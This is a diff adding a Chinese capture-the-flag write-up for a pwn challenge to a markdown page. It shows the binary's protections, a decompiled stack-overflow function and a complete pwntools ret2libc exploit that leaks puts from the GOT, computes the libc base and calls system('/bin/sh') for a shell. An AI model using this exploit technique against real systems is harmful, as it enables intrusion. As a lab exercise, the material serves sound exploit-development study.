@@ -1130,8 +1130,133 @@ r.interactive()
 
 ![image-20260524152516373](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260524154551732-1434354838.png)
 
- 
+---
+
+## [御网杯2026]PWN3_Pro
+
+::alert{icon="tabler:files" color="var(--c-accent)" title="附件地址"}
+
+[下载链接](https://gitee.com/ASUS_HACKED/cybersecurity/tree/比赛附件/御网杯2026/pwn3)
+
+::
+
+做出了一点点小小的改动，开启了NX保护，那这题就是ret2libc解法啦
+
+---
+
+### 0x01 分析程序
+
+```bash
+Arch:       amd64-64-little
+RELRO:      Partial RELRO
+Stack:      No canary found
+NX:         NX enabled
+PIE:        No PIE (0x400000)
+SHSTK:      Enabled
+IBT:        Enabled
+Stripped:   No
+```
+#### main()->0x0401208
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  setbuf(stdin, 0LL);
+  setbuf(stdout, 0LL);
+  setbuf(stderr, 0LL);
+  vuln();
+  return 0;
+}
+```
+
+#### vuln() -> 0x0401196
+
+```python
+int vuln()
+{
+  char buf[128]; // [rsp+0h] [rbp-80h] BYREF
+
+  puts("=== Message Board ===");
+  puts("Leave your message below:");
+  printf("Buffer at: %p\n", buf);
+  printf("Message: ");
+  read(0, buf, 0x100uLL);
+  return puts("Thank you for your message!");
+}
+```
+
+#### 已知条件
+
+vuln函数出现栈溢出，同时没有类似system和/bin/sh的字符串，利用ROPgadget也找不到类似字符，NX开启保护，考虑ret2libc
+
+---
+
+### 0x02 EXP
+
+libc题目思路就是先找出栈溢出点，第一次栈溢出先泄露puts在libc的偏移算出基址，拿到system和/bin/sh存储在libc的地址，返回漏洞函数第二次传输payload
+
+```python
+from pwn import *
+
+
+context(os='linux', arch='amd64')
+
+r = process('./vuln')
+elf = ELF('./vuln')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+r.recvuntil(b"Message: ")
+offset = 0x80+0x8
+
+payload_1 = b'a'*offset
+pop_rdi = 0x4012c3
+payload_1 += p64(pop_rdi)
+
+puts_got = elf.got['puts']
+puts_plt = elf.plt['puts']  
+
+payload_1 += p64(puts_got)
+payload_1 += p64(puts_plt)
+
+ret = 0x40125C
+payload_1 += p64(ret)*2 #这里就得需要两次垫片，可以先在返回vuln前做一个验证，看看
+
+vuln = 0x0401196
+payload_1 += p64(vuln)
+r.sendline(payload_1)
+
+
+r.recvline()
+leak = r.recvline().strip()
+puts_leak = u64(leak.ljust(8,b'\x00'))
+log.info(f"puts leak: {hex(puts_leak)}")
+
+#验证程序
+#payload_2 = b"11"
+#r.sendline(payload_2)
+#可以发现进入第二次函数
+#*=== Message Board ===
+#Leave your message below:
+#就崩掉了
+
+#part2
+r.recvuntil(b"Message: ")
+libc.address= puts_leak - libc.symbols['puts']
+system = libc.symbols['system']
+bin_sh = next(libc.search(b'/bin/sh\x00'))
+
+payload_2 = b'a'*offset
+payload_2 += p64(ret)
+payload_2 += p64(pop_rdi)
+payload_2 += p64(bin_sh)
+payload_2 += p64(system)
+
+
+r.sendline(payload_2)
+r.interactive()
+```
 
 ```md wrap
 pwn-ret2libc基础知识点，包含题目
 ```
+
